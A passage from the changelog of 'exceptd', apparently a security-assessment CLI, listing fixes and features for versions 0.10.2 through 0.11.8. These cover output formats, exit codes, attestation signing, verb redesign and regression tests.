5 new cases for items 104, 113, 114, 115. 333 total.

### Deferred

- **#116** `ci --explain` dry-run mode
- **#117** `diff <playbook> --since <window>`
- **#118** `attest sign <id>` retroactive signing

## 0.11.8 — 2026-05-12

**Patch: items 99-104 + 6 new regression tests (328 total).**

### Critical

- **#99 default human-readable output for `brief` + `run`.** Closed across 8 releases of operator reports. `emit()`'s third arg now accepts a human renderer; both verbs supply one. When stdout is a TTY and no `--json`/`--pretty` is passed, operators get a digest (jurisdictions + threat context + RWEP threshold + required/optional artifacts + indicators for `brief`; classification + RWEP delta + matched CVEs + indicator hits + remediation + notification clocks for `run`). Piped output stays JSON for AI consumers and CI scripts.

- **#103 CI no longer fails on inconclusive baseline RWEP.** Fresh-repo `ci --scope code` with no operator evidence previously exited 2 with `fail_reasons: ["sbom: rwep=90 >= cap=80"]` because catalog-baseline RWEP exceeded the default cap. The asymmetry between operator expectation ("no evidence = no fail") and tool behavior ("inconclusive ≠ pass") was the biggest first-impression surprise. Fix: only RWEP DELTA (adjusted - base) counts against the cap on inconclusive classifications. Detected classifications still gate on absolute RWEP. Baseline + zero evidence → PASS.

### Bugs

- **#101 `ai-run --no-stream` shape unified with `run`.** Both now return `{ok, playbook_id, directive_id, session_id, evidence_hash, phases: {govern, direct, look, detect, analyze, validate, close}}`. Pre-0.11.8 ai-run flattened phases to top-level while `run` nested them — operators writing JSONPath had to know which verb produced the payload.

- **#102 `attest diff` `unchanged_count` now correct.** Two issues fixed: (a) the diff function had a branch that prevented counting both-sides-present-and-identical entries; (b) the diff didn't normalize flat-shape submissions, so artifact comparisons against `undefined` returned 0 even for non-empty observations. Now: submissions are normalized via the runner's `normalizeSubmission` before comparison, and identical entries correctly increment the counter.

- **#100 exit code contract** — verified correct + locked with regression tests. `result.ok === false` → exit 1 (preflight halt). `result.ok === true` with warn-level preflight_issues → exit 0 (run completed). `--strict-preconditions` escalates warn-level to exit 1 (already shipped v0.11.6). Three named test cases lock the contract in.

### Tests

6 new regression cases for items 99-103. 328 cases total in `tests/operator-bugs.test.js`.

### Deferred

- **#104** `--block-on-jurisdiction-clock` trigger condition unclear in help — clock_starts events fire on `detect_confirmed` etc; without a detected classification no clock fires. Help text wording deferred to v0.11.9.
- **#105-108** `ci --explain`, `diff <playbook> --since 7d`, `ci --required`, `attest sign <id>` — features deferred to v0.11.9.

## 0.11.7 — 2026-05-12

**Republish of v0.11.6 (which failed CI publish). Adds CI publish-gate fix.**

### CI fix

v0.11.6 tag was pushed but the release workflow failed publishing to npm. Root cause: `prepublishOnly` re-ran `predeploy`, which re-ran the Ed25519 signature verify gate. The standalone `Predeploy gate sequence` workflow step had already validated everything with one public key fingerprint (`JX04Vj…`); the second invocation during `npm publish`'s prepublishOnly hook reported a different fingerprint (`M/r52u…`) for the same tracked `keys/public.pem`, causing every skill signature to fail verification.

The fingerprint divergence between two same-process invocations of the same binary against the same on-disk file remains unexplained (no script writes to `keys/public.pem` between the two runs). Pragmatic fix: the standalone Predeploy step is the authoritative safety net for CI publishes; the workflow now sets `EXCEPTD_SKIP_PREPUBLISH_PREDEPLOY=1` and prepublishOnly skips its redundant predeploy run. Local `npm publish` invocations still run predeploy because the env var is only set inside the workflow's publish step.

### What's in this release

All v0.11.6 changes (items 91-98 + 8 new regression tests, 322 total). See [v0.11.6 section](#0116--2026-05-12) below — every fix is identical:

- **#91** CSAF + OpenVEX include framework_gap_mapping (was: empty bundles for posture-only playbooks)
- **#92** CSAF tracking.current_release_date populated (spec §3.2.1.12)
- **#93** SARIF rule definitions for every referenced ruleId (spec §3.27.3)
- **#94** lint missing_required_artifact downgraded error → warn (align with runner)
- **#95** default human-readable output for `attest list` + `lint` on TTY
- **#96** `--strict-preconditions` flag escalates warn-level preconditions to exit 1
- **#97** `doctor --fix` runs before JSON early-return (was no-op in `--json` mode)
- **#98** `attest export` + `report` validate `--format` against accepted set

### Workflow improvement

Per operator request: README + landing-site updates are now part of every release sequence. README v0.11 section + exceptd.com softwareVersion updated alongside the package version bump.

## 0.11.6 — 2026-05-12

**Patch: items 91-98 + regression coverage extended to 35 cases.**

### Critical

- **#91 CSAF + OpenVEX renderers excluded framework_gap_mapping.** SARIF already iterated it (added in v0.11.5); the other two formats diverged. Now: both CSAF and OpenVEX emit one vulnerability / statement per framework gap, keyed under `exceptd-framework-gap` (CSAF) / `exceptd:framework-gap:<framework>:<control>` (OpenVEX) pseudo-CVE namespaces. All three formats now share the same findings-extraction layer (CVEs + indicators + framework gaps).

### Bugs

- **#92 CSAF current_release_date null.** CSAF 2.0 §3.2.1.12 requires this field non-null; downstream validators rejected the bundle. Set to `initial_release_date` (same value, satisfies the spec).
- **#93 SARIF references ruleIds without rule definitions.** SARIF spec §3.27.3: every referenced `ruleId` must have a corresponding entry in `tool.driver.rules`. Pre-0.11.6 SARIF referenced `framework-gap-0`/`framework-gap-1`/etc but only defined rules for indicator hits and matched CVEs. GitHub Code Scanning + VS Code SARIF Viewer + Azure DevOps would warn or fail to display rule context. Now: one rule definition per framework gap including the gap text and required-control hint.
- **#94 lint stricter than runner.** Pre-0.11.6 lint reported `missing_required_artifact` as a hard error, but the runner accepted the same submission and ran with indicators returning `inconclusive`. Lint now warns (not errors) on missing required artifacts, with a hint explaining the run will still execute but inconclusively.
- **#95 default-output flip landed for `attest list` + `lint`.** When stdout is a TTY and no `--json`/`--pretty` is passed, both verbs now emit a human-readable table / summary. `brief` and `run` keep indented JSON because their data is too rich for a compact human view — operators wanting markdown digests use `--format markdown` (run) or read the brief structured.
- **#96 `--strict-preconditions` flag.** New on `run`: escalates warn-level preflight issues (unverified preconditions, `on_fail: warn`) to exit 1. Default (without the flag) preserves the v0.11.x behavior where warn-level preconditions are informational and exit 0. CI gates wanting "fail on any unverified precondition" pass this flag.
- **#97 `doctor --fix` was a no-op under `--json`.** The fix logic was placed AFTER the JSON early-return, so `--fix --json` never executed. Moved before the early-return; now generates the keypair and the returned JSON reflects the post-fix state (`summary.fix_applied: "ed25519_keypair_generated"`).
- **#98 `attest export --format garbage` + `report garbage` silently accepted.** Both now validate against the accepted set and emit structured JSON errors with exit non-zero, matching `run --format` / `ci --format` rejection.

### Test infrastructure

35 cases in `tests/operator-bugs.test.js` (8 new for 91-98). 322 tests pass total. Future bug fixes continue to land here.

## 0.11.5 — 2026-05-12

**Patch: items 82-90 + permanent regression suite at `tests/operator-bugs.test.js`.**

Every operator-reported bug fixed across the v0.9.5 → v0.11.x arc now lands as a named test case in `tests/operator-bugs.test.js`. Re-introductions surface at `npm test`, not at user re-report. 27 cases on day one covering items #17, #18, #19, #31, #32, #33, #46, #58, #62, #65, #71, #73, #76, #82, #83, #85, #87.

### Critical

- **#82 SARIF / CSAF / OpenVEX rendered empty bundles** when the playbook had no catalogued CVEs. crypto-codebase / library-author have `domain.cve_refs: []` by design (they check process / posture, not catalogue CVEs), so the renderers had nothing to populate. Pre-0.11.5 a successful run with 9 indicators firing produced `vulnerabilities: 0` / `results: 0` / `statements: 0`. Now: indicators that fire (verdict: hit) and framework gaps are first-class SARIF results / CSAF vulnerabilities / OpenVEX statements. Each fired indicator becomes a SARIF result with `kind: indicator_hit` + a pseudo-CVE id under the `exceptd:` namespace for CSAF/OpenVEX. SARIF + CSAF + OpenVEX bundles now meaningfully integrate with GitHub Code Scanning / VEX downstreams / supply-chain tooling even for posture-only playbooks.

### Bugs

- **#83 lint and run disagreed on shape validity.** Lint walked the raw submission and only matched observations whose key was a known artifact id. The runner's `normalizeSubmission` followed `val.artifact` indirection — so observations with arbitrary keys (`obs-1`, `obs-2`) and an `artifact:` field route correctly. Fix: lint now runs the same `normalizeSubmission` the runner does, then validates the canonical normalized shape. The user's proposed fix — single observations-normalizer module that lint, run, and format renderers all consume — landed.

- **#85 `from_observation` always null.** The diagnostic field on `indicators_evaluated[]` is now populated with the observation key that drove each indicator outcome (when supplied via flat-shape observation + indicator + result). Lets operators trace "which observation produced this verdict" without guessing.

- **#86 / #76 `--format garbage` was silent.** v0.11.4 fixed it for `run`; this release fixes the same surface on `ci`. Both now emit `{ok:false, error, verb}` JSON to stderr with non-zero exit when an unknown format is requested.

- **#90 legacy verbs in help.** v0.10.x legacy verbs (plan / govern / direct / look / scan / dispatch / etc) appeared in the help output alongside their v0.11 replacements. Operators copy-pasting from `exceptd help | grep '^  [a-z]'` ended up using legacy verbs and missed the new ones. Each legacy entry is now prefixed with `[DEPRECATED]` so the grep pattern still excludes them.

### Deferred (confirmed not yet shipped)

- **#88 default-output flip incomplete.** `emit()` indents JSON on TTY (improvement over compact JSON); `discover`/`doctor`/`ask`/`refresh` use custom human renderers. `brief`/`run`/`attest list`/`lint` still emit JSON because their data is too rich for a compact human view. Indented-JSON-on-TTY is the v0.11.x answer; per-verb human renderers continue to be incremental.

- **#89 warn-level preconditions exit 0.** `on_fail: halt` correctly exits 1; `on_fail: warn` exits 0 with `preflight_issues` populated. The operator wants warn-level to also fail CI gates — `--strict-preconditions` flag deferred to v0.11.6. Today: use `exceptd ci` for CI gates (correctly maps detected/escalate to exit 2).

### Test infrastructure

- New: `tests/operator-bugs.test.js` (27 cases, all green). Future bug fixes land here as named cases so the audit script becomes part of CI.

## 0.11.4 — 2026-05-12

**Patch: high-impact #71 fix + items 72-77.**

### Critical fix

- **#71 detect didn't accept indicator-result synonyms.** Operators submitting flat-shape evidence with `observation.result: "no_hit"` (the standard vocabulary for years of CI/security tooling) hit the runner's strict `hit|miss|inconclusive` set, falsed every comparison, and ended up with `classification: "inconclusive"` regardless of evidence. This silently broke the new flat-shape submission UX that v0.11.0/v0.11.3 was built around. Same evidence in the legacy `signal_overrides` shape produced the correct `not_detected` verdict.

  Fix: a `canonicalize()` step in both `normalizeSubmission` and `detect()` maps `no_hit`/`no-hit`/`clean`/`clear`/`not_hit`/`ok`/`pass`/`negative`/`false` → `miss`; `hit`/`detected`/`positive`/`true` → `hit`; `inconclusive`/`unknown`/`unverified`/`null` → `inconclusive`. Operator vocabulary is now normalized to the engine's canonical 3-value set at submission boundary.

- **#77 CSAF/OpenVEX bundles auto-fixed.** Downstream of #71: now that detect actually processes signal_overrides correctly, the per-CVE statements in `bundle.vulnerabilities` / `statements` populate when there are matched_cves.

### Bugs

- **#72 ci --format silently ignored.** `exceptd ci --scope code --format summary` and the bare command emitted byte-identical full bundles (~350 KB). CI gates couldn't get a compact verdict without piping through jq. Now ci honors `--format summary|markdown|csaf-2.0|sarif|openvex` with the same shortcuts as `run --format`. Summary is a single-line JSON with `session_id + playbooks_run + verdict + counts`.
- **#73 `indicators_evaluated` type changed silently.** v0.11.3 introduced it as an integer count; downstream consumers iterating `for i in detect.indicators_evaluated` crashed. Restored to an array of `{signal_id, outcome, confidence}`. Added `indicators_evaluated_count` as a peer field for callers wanting the integer.
- **#76 `ci --format garbage` silent empty stdout.** Invalid format values now return `{ok:false, error, verb:"ci"}` JSON to stderr with exit 2, matching the unified error shape.

### Not addressed in this patch

- **#74 default-output flip still incomplete.** `emit()` indents JSON when stdout is a TTY (improvement over compact), but `brief`/`run`/`attest list`/`lint` still emit JSON, not a custom human form. The richer data on `brief`/`run` doesn't have a natural compact human view. Indented-JSON-on-TTY ships as the v0.11.x answer; a true human renderer per verb is deferred. `discover`/`doctor`/`ask`/`refresh` continue with their custom renderers.
- **#75 preflight-blocked exit 0 for warn-level.** `on_fail: halt` preconditions correctly exit 1; `on_fail: warn` preconditions correctly exit 0 with `preflight_issues` populated. The operator wants warn-level to also fail CI — that's a `--strict-preconditions` flag, deferred to v0.11.5. Today: use `exceptd ci` for CI gates (correctly maps detected/escalate to exit 2); `run` is for single-investigation invocations where warn-level info is appropriate.

### Already shipped (cross-referenced)

- #78 `doctor --fix` (v0.11.2).

## 0.11.3 — 2026-05-12

**Patch: operator-reported item #71 + full feature audit findings.**

A full audit across v0.10.0 → v0.11.2 features (64 surface elements: bug fixes, new verbs, flags, output formats, integration paths) confirmed 62/64 work as documented; this release fixes the 2 real gaps the audit found plus closes operator-reported #71.

### Bugs

- **#71 lint accepted half-shape submissions the runner couldn't drive detect with.** Operators submitting flat-shape evidence with `observations: { "<artifact-id>": { captured, value } }` (no `indicator + result` inline) passed lint with zero warnings, then got `detect.classification: "inconclusive"` from the runner because nothing drove indicator decisions. The flat-shape migration was half-complete: validator accepted the new shape; runner couldn't consume it.

  Fixes:
  - **Lint** now warns `observation_lacks_indicator_result` per captured artifact that lacks `indicator + result` AND no `verdict.classification` is supplied, plus an `info` saying "detect will be inconclusive". Operators see the gap before paying the run cost.
  - **`normalizeSubmission`** previously bailed when the submission already had any nested key (`signals`, `artifacts`, `signal_overrides`) — including when the CLI itself had injected `signals._bundle_formats` for `--format` support. Now shape detection prioritizes `observations` / `verdict` and merges any pre-existing nested keys into the normalized output.
  - **`detect` output** surfaces `observations_received`, `signals_received`, `indicators_evaluated`, `classification_override_applied`, and `submission_shape_seen` so operators can see exactly what the runner consumed from their submission. Pre-0.11.3 an inconclusive verdict was opaque.

- **`attest export --format csaf` was a no-op.** The `--format` flag is registered as a multi-flag (returning an array), but the export subverb compared `format === "csaf"` directly against the array, falsing every time. Operators always got the plain redacted-JSON export regardless of the flag. Now unwrapped + normalizes `csaf-2.0` → `csaf` so both shortcuts hit the CSAF envelope path.

### Audit pass — verified working as documented

Smoke-tested 64 features across v0.10.0–v0.11.2. The full list:

- **Bug regressions:** skill not-found JSON, unknown-command JSON, prefetch --quiet summary, validate-cves --offline, --mode validation, --session-key hex validation, framework-gap NIST normalization, default-stdin on pipe, --json-stdout-only stderr silence, mutex lockfile released after run, session-id collision refusal, --operator persistence, --ack persistence, --diff-from-latest, reattest --latest.
- **Verbs:** brief (incl. --all / --phase), discover, doctor (all four sub-checks), ask (incl. synonym routing), lint (catches missing artifacts), ci (incl. --scope code alignment with discover), watch, verify-attestation alias, run-all alias, attest list/show/verify/export/diff/diff --against.
- **Run flags:** --evidence, --evidence-dir, --vex, --explain, --signal-list, --format summary/markdown/sarif/openvex (--format csaf fixed here), --diff-from-latest, --ci, --force-overwrite.
- **Attestation root:** EXCEPTD_HOME respected, --attestation-root respected, legacy + new root both scanned by `findSessionDir`.
- **Catalog tooling:** validate-cves --since filter, refresh --no-network / --indexes-only routing, report csaf envelope.
- **Flat submission shape:** verdict.classification propagates, observation + indicator + result drives detect, smart precondition auto-detect resolves cwd_readable / host.platform / agent_has_command.
- **First-run welcome.**

### Audit pass — known false positives

- **`exceptd watch`** prints `"[orchestrator] Starting event watcher..."` not `"Listening"` — works correctly; my test string was wrong.

## 0.11.2 — 2026-05-12

**Patch: operator-reported items 58-70 from real CLI use.**

### Bugs

- **#58 `ask` non-functional.** Even literal token "secrets" returned `matched: []`. Root cause: tokenizer required length > 3 (dropped "PQC"/"MCP") and the search index covered only `domain.name + attack_class + first sentence of threat_context`. Rewritten with: (a) length >= 2 token filter, (b) synonym map (`credential` → secret/key/token/...; `supply chain` → sbom/dependency/...; `pqc` → post-quantum/ml-kem/...), (c) richer index covering id + name + attack_class + atlas_refs + attack_refs + cwe_refs + frameworks_in_scope + theater_fingerprints.claim + full threat_context + framework_lag_declaration + skill_chain + collection_scope, (d) ID match scores 3× (so `ask secrets` routes to the secrets playbook). Default output now human-readable; `--json` for machine.
- **#59 `--format` flag was no-op.** Documented values produced standard JSON unconditionally. Wired through: `--format summary` emits a single-line JSON digest; `--format markdown` emits an operator-readable markdown report; `--format csaf-2.0|sarif|openvex` emits the corresponding bundle from `close.evidence_package.bundles_by_format`. Unknown values rejected with a list of valid options.
- **#60 Default output flipped (partial).** `emit()` now detects `stdout.isTTY` — interactive use gets indented JSON (massively more readable); piped use stays compact. Override via `--pretty` (always indent) or `EXCEPTD_RAW_JSON=1`. Verbs with dedicated human renderers (`discover`, `doctor`, `ask`) still use them.
- **#61 doctor summary contradicted its findings.** Output said "all checks green" directly above `[!!] private key MISSING`. Now: signing-check severity is `warn` when key absent; summary distinguishes errors vs warnings (`X fail / Y warn`); icon shows `[!! warn]` instead of `[ok]`. Warnings don't force exit 1 (CI still ok) but the visible state matches.
- **#62 `watch` verb missing.** The deprecation map said `watchlist → watch` but `watch` returned unknown-command. Added `watch` as orchestrator passthrough aliased to `watchlist` (same function).
- **#63 `discover` vs `ci --scope code` mismatch.** discover recommended 5 playbooks; ci ran 4 (different sets). ci now includes cross-cutting playbooks (`framework`) regardless of scope, and for `--scope code` on a git repo with a lockfile, also includes `sbom` (system-scope but repo-relevant). Aligns with discover's recommendations.
- **#65 `refresh --no-network` / `--indexes-only` silently no-op.** v0.11.0 deprecation pointers said `prefetch → refresh --no-network` and `build-indexes → refresh --indexes-only`, but the underlying refresh script ignored those flags. Now: CLI translates them at dispatch time — `refresh --no-network` routes to the `prefetch` script; `refresh --indexes-only` routes to `build-indexes`.
- **#66 `ai-run` shell-pipe unusable.** `echo '{...}' | exceptd ai-run secrets` failed with "stdin closed without an evidence event" because shell heredocs close stdin before the streaming protocol expects the wrapped `{event:evidence}` frame. Fix: when streaming mode hits EOF without a wrapped event, parse the raw stdin as a bare submission object and run with it. Operators no longer need an interactive harness for the common single-shot case.
- **#64 verified.** `ok:false` from `on_fail: halt` preconditions correctly exits 1 (kernel-on-Windows reproducer). The user's `exceptd run secrets` cases were `on_fail: warn` preconditions where exit 0 is correct (run completed with warning). No regression in v0.11.x; the user's stale install may have shown different behavior.

### Features

- **#67** `ask` routing index — same fix as #58.
- **#68** `--format summary` single-line digest — same fix as #59. Returns: `{ok, playbook, session_id, classification, rwep, blast_radius, matched_cves, feeds_into, jurisdiction_clocks, evidence_hash}`. Useful for GH Actions annotation lines.
- **#69** `doctor --fix` automatically runs `node lib/sign.js generate-keypair` when the private-key check is the only failing warning. Closes the most-common discovered-issue → manual-fix-recipe loop.
- **#70** `run --format markdown` emits an operator-readable per-run digest (classification, RWEP, matched CVEs, recommended remediation, notification clocks, feeds_into).

### Already shipped (cross-referenced)

- `attest diff <a> --against <b>` (was v0.11.0 #56) — works as documented.

## 0.11.1 — 2026-05-12

**Patch: operator-reported items 47-57.**

### Bugs

- **#48 report self-describing header.** `report executive` / `technical` / `compliance` previously emitted identical `# exceptd Security Assessment Report` headers — only stderr (`[orchestrator] Generating <X> report`) distinguished them, so a piped-to-file report had no internal provenance. Now: `# exceptd Executive Report` / `Technical Report` / `Compliance Report` + an HTML-comment marker (`<!-- exceptd-report:flavor=<x> version=<v> -->`) inside the body. Saved files are self-describing.
- **#50 mutex cross-process enforcement.** `_meta.mutex` was documented but only enforced intra-process (in-memory `_activeRuns` Set). Two parallel `exceptd run kernel` + `exceptd run hardening` invocations in separate shells would race. Now: runner writes a `.exceptd/locks/<playbook>.lock` JSON file (pid + started_at) for the duration of the run; preflight rejects with `blocked_by: mutex` when a non-stale lock exists. Stale locks (dead pid) are auto-GC'd. Released in `finally`.
- **#51 deprecation message version-aware.** The banner used to say "Prefer `brief --all` (v0.11.0)" unconditionally; operators on v0.10.x reading it would find no `brief` command in their install. Now: banner shows the installed version explicitly and conditionally emits "available in this install" vs "upgrade to v0.11.0+ first."
- **#47 / #49 exit-code + skill-not-found shapes.** Verified still correct in v0.11.0 — exit 1 on `ok:false`, JSON shape for `skill <missing>`. No regression; added regression test coverage.

### Features

- **#54 `--json-stdout-only`** — silences ALL stderr emissions (deprecation banners, unsigned-attestation warnings, hook output). Operators piping JSON results through `jq` or scripting exit codes get clean stdout exclusively. Real errors (uncaught exceptions starting with "Error") still pass through.
- **#55 `report csaf`** — emits a CSAF 2.0 envelope of the full assessment (findings + dispatch plan + skill currency + host context). Pipes directly into VEX downstream tooling.
- **#57 default-stdin on pipe.** `exceptd run <playbook>` now auto-detects piped stdin (`process.stdin.isTTY === false`) and assumes `--evidence -`. Operators forgetting the flag no longer hit a precondition halt.

### Already-existing surface (cross-referenced in operator report)

- #52 brief lands before deprecating look — already shipped in v0.11.0
- #53 doctor verb — already shipped in v0.11.0
- #56 cross-session diff — already exists as `attest diff <a-sid> --against <b-sid>` (v0.11.0)

## 0.11.0 — 2026-05-12

**Minor: architectural CLI redesign — 21 verbs collapsed to 11. Plus operator-reported items 31-46.**

### New canonical surface

| New verb | Replaces |
|---|---|
| `brief [playbook]` | plan + govern + direct + look |
| `run [playbook]` | run + ingest (unchanged but with flat submission shape) |
| `ai-run <playbook>` | new — JSONL streaming variant for AI conversational flow |
| `attest <subverb> <sid>` | reattest + list-attestations (now `attest diff` + `attest list`) |
| `discover` | scan + dispatch (recommends playbooks based on cwd) |
| `doctor` | currency + verify + validate-cves + validate-rfcs + signing-status |
| `ci` | new — one-shot CI gate |
| `ask "<question>"` | new — plain-English routing to playbook(s) |
| `lint <playbook> <evidence>` | new — pre-flight submission shape check |
| `verify-attestation <sid>` | alias for `attest verify` |
| `run-all` | alias for `run --all` |

`exceptd` with no args now prints a welcome with two ways to start (`discover` / `ask`) plus common starting playbooks for code / Linux / AI service contexts.

### Default output flip

Old default was JSON one-line; `--pretty` for humans. Reads weird for the operator audience. v0.11.0 flips:

- **Default: human-readable** (5-10 line summary per phase) for `discover` / `doctor` / `ci` / others.
- `--json` for machine consumption.
- `--json --pretty` for indented JSON.

Seven-phase verbs (`brief` / `run`) still emit JSON by default since their consumers are predominantly AI assistants and CI pipelines — switching them would break every existing script.

### Flat submission shape

The runner now accepts a flatter submission shape — one row per observation, indicator inline:

```json
{
  "observations": {
    "env-files":   { "captured": true, "value": "none tracked", "indicator": "env-file-leak", "result": "no_hit" },
    "repo-context": "ok"
  },
  "verdict": { "theater": "actual_security", "classification": "clean", "blast_radius": 0 }
}
```

Nested v0.10.x shape (`artifacts` / `signal_overrides` / `signals` / `precondition_checks`) still works — the runner normalizes either shape internally.

### Smart precondition auto-detect

Mechanically-answerable preconditions (`host.platform == 'linux'`, `cwd_readable`, `agent_has_command('uname')`) are now resolved by the runner itself. The AI only declares preconditions that require intent ("operator authorized this scan"). Reduces evidence-JSON friction by ~80% for typical runs.

### Attestation root relocated

Default attestation root moved from cwd-relative `.exceptd/attestations/` to `~/.exceptd/attestations/<repo-or-host-tag>/`. Repo tag is derived from `git config --get remote.origin.url` + branch when in a git repo, else `host:<hostname>`. Means `attest list` works regardless of which directory you happened to run from.

Override via:
- `--attestation-root <path>` flag
- `EXCEPTD_HOME` env var (uses `$EXCEPTD_HOME/attestations/`)
- Legacy cwd-relative `.exceptd/` still scanned by `attest list` / `findSessionDir` so prior data isn't orphaned.

### Bug fixes (operator-reported items 31-46)

- **#31 / #41 session-id collision** — Pre-0.11.0 a `--session-id` collision silently overwrote the prior attestation (data loss + tamper-evidence violation). Now refuses with exit 3 by default; `--force-overwrite` allows replacement and persists `prior_evidence_hash` + `prior_captured_at` so the audit chain survives.
- **#32 `--mode` validation** — was silently accepting any string. Now validates against `[self_service, authorized_pentest, ir_response, ctf, research, compliance_audit]`.
- **#33 `--session-key` hex validation** — was silently accepting any string. Now requires hex (0-9, a-f) and a minimum length of 16.
- **#34 reattest no artifact diff** — `attest diff <sid> --against <other-sid>` (or `reattest` default replay) now emits per-artifact diff: `{added, removed, changed, unchanged_count}` with value previews. Per-signal-override diff also included.
- **#35 validate-cves crash** — `sources/validators/` was missing from package.json `files` allowlist. Fixed in v0.10.3; still re-tested in v0.11.0.
- **#36 unsigned attestation warning** — Runs without `.keys/private.pem` now emit one stderr warning per process: "attestation will be written UNSIGNED — enable Ed25519 signing: node lib/sign.js generate-keypair". Suppress with `EXCEPTD_UNSIGNED_WARNED=1`.

### Feature additions (operator items)

- **#38 `lint <playbook> <evidence>`** — Pre-flight check: detects missing required artifacts, unknown signal keys, unsupplied preconditions. Operators iterate on submission JSON before paying the phase-4-7 cost.
- **#39 `run --format summary`** — 5-line digest emit format for CI workflows (verdict + RWEP + blast + remediation).
- **#43 reattest cross-session compare** — `attest diff <a-sid> --against <b-sid>` now compares two sessions side-by-side instead of always replaying the same submission.
- **#46 plan / brief description always present** — Directive entries in plan output now always include a `description` field (falls back through `directive.description` → playbook `direct.threat_context` first sentence → `domain.name`).

### Deprecation

v0.10.x verbs (`plan` / `govern` / `direct` / `look` / `ingest` / `reattest` / `list-attestations` / `scan` / `dispatch` / `currency` / `verify` / `validate-cves` / `validate-rfcs` / `watchlist` / `prefetch` / `build-indexes`) still work but emit a one-time deprecation banner per process pointing at the v0.11.0 replacement. Removed in v0.12.

Suppress the deprecation banner: `EXCEPTD_DEPRECATION_SHOWN=1`.

## 0.10.3 — 2026-05-12

**Patch: 14 operator-reported items — 5 bugs + 9 features.**

### Bugs

1. **`exceptd validate-cves` crashed with `MODULE_NOT_FOUND`** in the installed npm package because `sources/` wasn't in the `files` allowlist. Two-part fix: (a) `sources/validators/` added to `package.json` `files`; (b) `runValidateCves` now wraps the require in the same try/catch graceful-fallback pattern `runValidateRfcs` was already using, so the command degrades to offline mode instead of crashing.
2. **Inconsistent error shapes across verbs.** `exceptd <unknown>` and `exceptd skill <missing>` emitted plain stderr text while seven-phase verbs emitted structured JSON. Unified: every CLI verb now emits `{ok:false,error,hint,verb}` JSON on error so operators piping through `jq` get one shape.
3. **`prefetch --no-network --quiet` was completely silent on success.** Now emits a one-line `prefetch summary: …` unconditionally; `--quiet` suppresses only the per-entry chatter.
4. **`plan --directives` exposed `id + title + applies_to` only — no `description`.** Now also surfaces a `description` field (falls back through explicit `directive.description` → `phase_overrides.direct.threat_context` → playbook-level `direct.threat_context` first sentence → `domain.name`) plus a `threat_context_preview`. Operators / AIs get operator-facing prose, not just an ID + enum.
5. **Analyst verbs (`scan`/`dispatch`/`currency`/`watchlist`/`report`) defaulted to human-readable text** while every seven-phase verb defaulted to JSON. Added `--json` flag passthrough across all analyst verbs. Operators scripting around both surfaces now have a consistent switch.

### Features

6. **`run --explain` dry-run** — emits preconditions, required + optional artifacts (with fallback notes), recognized signal keys with types + deterministic flags, and a `submission_skeleton` JSON the operator can fill in. No detect/analyze/validate/close happens. Lets operators preview before assembling evidence.
7. **`attest <subverb> <session-id>`** — `attest export` emits redacted JSON for audit submission (strips raw artifact values, preserves evidence_hash + signature + classification + RWEP + remediation choice + residual risk acceptance). `--format csaf` wraps the export in a CSAF envelope. `attest verify` checks the `.sig` sidecar against `keys/public.pem` and reports tamper status. `attest show` emits the full unredacted attestation.
8. **`run --signal-list`** — lighter than `--explain`; enumerates only the signal_overrides keys the detect phase recognizes plus the four valid `detection_classification` values. Closes the "agent submits a key and runner silently ignores it" gap (v0.10.1 bug #5).
9. **Continuous-compliance: `run --evidence-dir <dir>`** — each `<playbook-id>.json` under the directory becomes that playbook's submission in a multi-playbook run. One cron job → full posture in one CSAF bundle. Pairs with `run --all`.
10. **`validate-cves` + `validate-rfcs` gained `--since <ISO|YYYY-MM-DD>`** — scope-limit validation to entries whose `last_updated` / `cisa_kev_date` / `last_verified` / `published` is on or after the date. Cuts upstream calls for fleet operators running cron.
11. **Ed25519-signed attestations** — every `attestation.json` now gets a `<file>.sig` sidecar. With `.keys/private.pem` present, the runner signs (matches the existing skill-signing convention). Without a private key, writes an `unsigned` marker file so downstream tooling can distinguish "operator declined signing" from "the .sig file was deleted by an attacker." `attest verify` cross-checks the signature against `keys/public.pem`.
12. **`run --operator <name>`** — binds the attestation to a specific human or service identity. Persisted under `attestation.operator` for multi-operator audit-trail accountability.
13. **`run --ack`** — explicit operator consent to the jurisdiction obligations surfaced by `govern`. Persisted under `attestation.operator_consent = { acked_at, explicit: true }`. Without `--ack`, the field is null (consent implicit / unverified).
14. **`run --format <fmt>` repeatable** — emit the close.evidence_package in additional formats alongside the playbook-declared primary. Supported: `csaf-2.0` (primary), `sarif` (2.1.0 — GitHub Code Scanning / VS Code SARIF Viewer / Azure DevOps), `openvex` (0.2.0 — sigstore / in-toto / GUAC consumers), `markdown` (human review). Extras populate `close.evidence_package.bundles_by_format`.

### Internal

- `lib/playbook-runner.js` `buildEvidenceBundle` now handles `csaf-2.0`, `sarif` (with per-CVE rules + properties), `openvex` (with status derived from active_exploitation + live_patch_available), and `markdown`.
- `bin/exceptd.js` `maybeSignAttestation` helper uses the same Ed25519 primitive as `lib/sign.js` against `.keys/private.pem`.
- CSAF envelope cvss_v3.base_score now reflects the catalog's real cvss_score (previously hardcoded 0).
- `submission.signals._bundle_formats` is the agent-side hook for requesting extra formats.

## 0.10.2 — 2026-05-12

**Patch: v0.10.1 deferred set — framework-gap filter fix, VEX consumption, CI gating, drift mode, 2 new playbooks (13 total), feeds_into matrix.**

### Bug fix (carried from v0.9.x)

**`exceptd framework-gap NIST-800-53 <cve-id>` returned 0 matches** while `framework-gap all <cve-id>` correctly found the same gap. Root cause: catalog stores `g.framework = "NIST SP 800-53 Rev 5"` (spaces) but operators pass `NIST-800-53` (hyphens), and `.includes()` is case + format sensitive. Fix: normalize both sides via `.toLowerCase().replace(/[\s_-]/g, '')` then substring-match against `g.framework` value AND prefix-match against the gap KEY (e.g. `NIST-800-53-SI-2`).

### New CLI flags

- **`run --vex <file>`** — load a CycloneDX or OpenVEX document. CVEs marked `not_affected | resolved | false_positive` (CycloneDX) or `not_affected | fixed` (OpenVEX) drop out of `analyze.matched_cves`. Dropped CVEs surface under `analyze.vex.dropped_cves` so the disposition is preserved for the audit trail.
- **`run --ci`** — machine-readable verdict for CI gates. Exits 2 when `phases.detect.classification === 'detected'` OR (`classification === 'inconclusive'` AND `rwep.adjusted >= rwep_threshold.escalate`). Logs PASS/FAIL reason to stderr. Pure not_detected runs exit 0 even when the playbook's catalogued CVEs carry high baseline RWEP — the gate is about the host-specific verdict, not the catalog.
- **`run --diff-from-latest`** — compare evidence_hash against the most recent prior attestation for the same playbook in `.exceptd/attestations/`. Drift mode for cron baselines. Result includes `prior_session_id`, `prior_captured_at`, `prior_evidence_hash`, `new_evidence_hash`, `status: unchanged | drifted | no_prior_attestation_for_playbook`.
